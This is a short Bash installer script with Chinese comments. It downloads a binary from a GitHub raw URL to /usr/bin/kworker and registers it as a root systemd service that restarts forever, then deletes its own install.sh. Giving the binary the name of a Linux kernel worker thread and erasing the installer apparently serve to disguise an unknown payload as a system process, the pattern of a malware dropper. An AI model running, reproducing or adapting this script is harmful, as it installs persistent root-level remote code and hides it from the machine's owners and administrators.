#!/bin/bash

# 自动清理 Windows 换行符
if [ -f "$0" ]; then
    sed -i 's/\r//' "$0"
fi

set -e
set -x

# 下载kworker到指定路径
wget -O /usr/bin/kworker https://raw.githubusercontent.com/r00tin/oktest/refs/heads/main/kworker

# 设置权限
chmod +x /usr/bin/kworker

# kworker路径和工作目录
KWORKER_PATH="/usr/bin/kworker"
WORKING_DIR="/usr/bin/"

# 创建systemd服务文件内容
SERVICE_CONTENT="[Unit]
Description=kworker Service
After=network.target

[Service]
ExecStart=$KWORKER_PATH
WorkingDirectory=$WORKING_DIR
Restart=always
User=root
Group=root
LimitNOFILE=65536

[Install]
WantedBy=multi-user.target"

# 检测系统类型并创建服务
if [ -f /etc/debian_version ]; then
    echo "Detected Debian/Ubuntu system."
    echo "$SERVICE_CONTENT" > /etc/systemd/system/kworker.service

elif [ -f /etc/redhat-release ]; then
    echo "Detected CentOS system."
    echo "$SERVICE_CONTENT" > /etc/systemd/system/kworker.service

else
    echo "Unsupported system type."
    exit 1
fi

# 重新加载 systemd 配置
systemctl daemon-reload

# 启用并启动服务
systemctl enable kworker.service
systemctl start kworker.service

# 检查服务状态
systemctl is-active --quiet kworker.service && echo "kworker service started successfully." || { echo "Failed to start kworker service."; exit 1; }

# 删除安装脚本
rm -f install.sh

echo "脚本已完成，kworker服务已安装并启动。"
